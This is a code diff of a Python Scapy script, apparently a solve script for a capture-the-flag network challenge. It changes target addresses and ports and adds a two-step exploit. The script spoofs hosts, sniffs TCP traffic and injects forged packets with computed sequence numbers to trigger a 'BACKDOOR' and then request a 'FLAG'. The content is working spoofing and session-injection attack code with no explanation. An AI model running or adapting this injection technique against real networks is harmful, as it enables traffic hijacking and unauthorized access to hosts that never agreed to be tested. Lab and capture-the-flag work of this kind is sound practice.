@@ -14,13 +14,18 @@ main_if_mac = get_if_hwaddr(MAIN_IF)
 main_if_ip = get_if_addr(MAIN_IF)
 broadcast_mac = "ff:ff:ff:ff:ff:ff"
 
-target_1_ip = "10.0.0.3"
-target_2_ip = "10.0.0.4"
+# target_1_ip = "10.0.0.3"
+# target_2_ip = "10.0.0.4"
+target_1_ip = "3.13.37.3"
+target_2_ip = "3.13.37.4"
 
 target_1_mac = ""
 target_2_mac = ""
 
-target_port = 31337
+# target_port = 31337
+target_port = 1992
+
+backdoored = False
 
 flag_mode = False
 
@@ -60,7 +65,8 @@ def spoof_target(target_ip, target_mac, fake_ip):
     sendp(pkt, iface=MAIN_IF)
 
 
-def backdoor(port, seq, ack, msg):
+def backdoor(port, seq, ack):
+    global backdoored
     # prerequisites
     # needs target macs first
     if target_1_mac == "" or target_2_mac == "":
@@ -74,23 +80,49 @@ def backdoor(port, seq, ack, msg):
     pkt[TCP].sport = port
     pkt[TCP].dport = target_port  # target_1 always listens on this port
     pkt[TCP].seq = ack
-    pkt[TCP].ack = seq + len(msg)
+    pkt[TCP].ack = seq + len("SECRET CONFIRMED\n:>\n")
     pkt[TCP].flags = "PA"
-    pkt[Raw].load = b"FLAG\n"
+    pkt[Raw].load = b"BACKDOOR\n"
     # pkt.show()
     sendp(pkt, iface=MAIN_IF)
 
+    # backdoor is now open
+    backdoored = True
+
+
+def get_flag(port, seq, ack):
+    flag_pkt = Ether() / IP() / TCP() / Raw()
+    flag_pkt[Ether].src = target_2_mac
+    flag_pkt[Ether].dst = target_1_mac
+    flag_pkt[IP].src = target_2_ip
+    flag_pkt[IP].dst = target_1_ip
+    flag_pkt[TCP].sport = port
+    flag_pkt[TCP].dport = target_port  # target_1 always listens on this port
+    flag_pkt[TCP].seq = ack
+    flag_pkt[TCP].ack = seq + len("BACKDOOR OPEN\n")
+    flag_pkt[TCP].flags = "PA"
+    flag_pkt[Raw].load = b"FLAG\n"
+    # print("\n-----\nFlag packet:\n")
+    # flag_pkt[TCP].show()
+    # print("\n-----\n")
+
+    sendp(flag_pkt, iface=MAIN_IF)
+
 
 def packet_handler(pkt):
+    global backdoored
     raw_load = pkt[Raw].load.decode("latin")
     print(
         str(pkt[IP].src) + ":" + str(pkt[TCP].sport),
         ">",
         str(pkt[IP].dst) + ":" + str(pkt[TCP].dport),
     )
-    if raw_load.startswith("COMMANDS"):
-        backdoor(port=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, msg=raw_load)
+    if raw_load.startswith("SECRET CONFIRMED") and not backdoored:
+        backdoor(port=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack)
+    if raw_load.startswith("BACKDOOR OPEN") and backdoored:
+        get_flag(port=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack)
     print(raw_load, end="")
+    # pkt[TCP].show()
 
 
 def capture_packets():
